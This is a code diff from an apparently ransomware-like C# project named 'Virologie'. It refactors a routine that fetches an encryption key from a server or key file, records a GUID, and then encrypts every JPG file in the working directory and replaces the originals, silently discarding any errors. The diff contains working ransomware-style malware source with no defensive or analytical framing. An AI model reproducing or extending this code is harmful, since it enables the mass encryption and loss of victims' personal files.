@@ -56,12 +56,13 @@ namespace Virologie
                 ? CryptoKeyManager.CreateFromServer("http://localhost:1234/")
                 : CryptoKeyManager.CreateFromFile(_keyfile);
 
-            var files = explorer.EnumerateFiles(Directory.GetCurrentDirectory(), "*.jpg");
-            int count = 1;
-            var enumerable = files as IList<string> ?? files.ToList();
             CryptoKeyManager.SaveGUID();
+            explorer.ApplyTo(Directory.GetCurrentDirectory(), new[] {"*.jpg"}, CreateFileAction(encrypter));
+        }
 
-            foreach (var file in enumerable)
+        private FileExplorer.FileAction CreateFileAction(FileEncrypter encrypter)
+        {
+            return file =>
             {
                 try
                 {
@@ -70,14 +71,16 @@ namespace Virologie
                     else
                         encrypter.Encrypt(file);
 
-                    explorer.ReplaceFile(file);
+                    FileExplorer.ReplaceFile(file);
                 }
-                catch
-                { }
-                ReportProgress(100*count++/(100*enumerable.Count()));
+                // ReSharper disable once EmptyGeneralCatchClause
+                catch (Exception)
+                {}
+
+                ReportProgress(0);
                 CurrentFile = file;
                 SwitchFiles();
-            }
+            };
         }
     }
 }
